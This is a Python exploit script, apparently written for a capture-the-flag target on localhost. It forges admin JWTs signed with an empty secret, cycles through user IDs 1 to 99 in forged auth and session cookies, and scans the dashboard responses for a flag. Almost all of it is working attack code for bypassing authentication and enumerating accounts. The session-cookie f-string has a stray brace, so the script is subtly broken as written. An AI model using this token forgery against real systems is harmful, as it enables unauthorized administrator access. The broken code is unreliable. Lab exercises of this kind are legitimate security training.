import requests
import re
import base64
import json
import hmac
import hashlib

base_url = "http://127.0.0.1:32883"

def create_jwt(user_id, user_type="admin", username="test"):
    """Create a JWT with given parameters"""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "username": username,
        "user_id": user_id,
        "user_type": user_type
    }
    
    def base64url_encode(data):
        return base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).decode().rstrip('=')
    
    encoded_header = base64url_encode(header)
    encoded_payload = base64url_encode(payload)
    message = f"{encoded_header}.{encoded_payload}"
    
    # Use empty secret (signature not validated anyway)
    signature = hmac.new(b'', message.encode(), hashlib.sha256).digest()
    encoded_signature = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    return f"{message}.{encoded_signature}"

# Test different user_id values as admin
test_range = range(1, 100)

print(f"[*] Testing user_id range {test_range.start} to {test_range.stop-1} with user_type='admin'\n")

success_count = 0
flag_found = False
unique_responses = {}

for user_id in test_range:
    # Create JWT for this user_id as admin
    jwt_token = create_jwt(user_id, "admin")
    
    # Create session with forged JWT
    session = requests.Session()
    session.cookies.set('auth_token', jwt_token)
    session.cookies.set('session', f'eyJ1c2VyX2lkIjp7user_id}7D.dummy.signature')
    
    # Access dashboard
    resp = session.get(f"{base_url}/dashboard", allow_redirects=False)
    
    status = resp.status_code
    content_len = len(resp.content)
    content_hash = hashlib.md5(resp.content).hexdigest()
    
    # Track unique responses
    if content_hash not in unique_responses:
        unique_responses[content_hash] = {
            'user_id': user_id,
            'status': status,
            'length': content_len,
            'content': resp.text
        }
    
    # Check for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    if flag_match:
        print(f"\n{'='*80}")
        print(f"[!!! FLAG FOUND !!!] user_id={user_id} (as admin)")
        print(f"[!] Status: {status} | Length: {content_len}B")
        print(f"[!] FLAG: {flag_match.group(0)}")
        print(f"[!] Full Response:")
        print(resp.text)
        print(f"{'='*80}\n")
        flag_found = True
        break
    elif status == 200 and content_len != 1847:  # Different from normal dashboard
        print(f"\n[INTERESTING] user_id={user_id} → Status: {status} | Length: {content_len}B")
        print(f"  Response preview: {resp.text[:500]}")
        success_count += 1

print(f"\n{'='*80}")
print(f"[SUMMARY]")
print(f"  Range tested: {test_range.start} to {test_range.stop-1}")
print(f"  Flag found: {flag_found}")
print(f"  Unique response types: {len(unique_responses)}")

if not flag_found and len(unique_responses) <= 5:
    print(f"\n[INFO] Showing unique response types:")
    for idx, (hash_val, data) in enumerate(unique_responses.items(), 1):
        print(f"\n  Response Type {idx}:")
        print(f"    First seen at user_id: {data['user_id']}")
        print(f"    Status: {data['status']} | Length: {data['length']}B")
        if data['status'] == 200:
            print(f"    Content preview: {data['content'][:300]}")

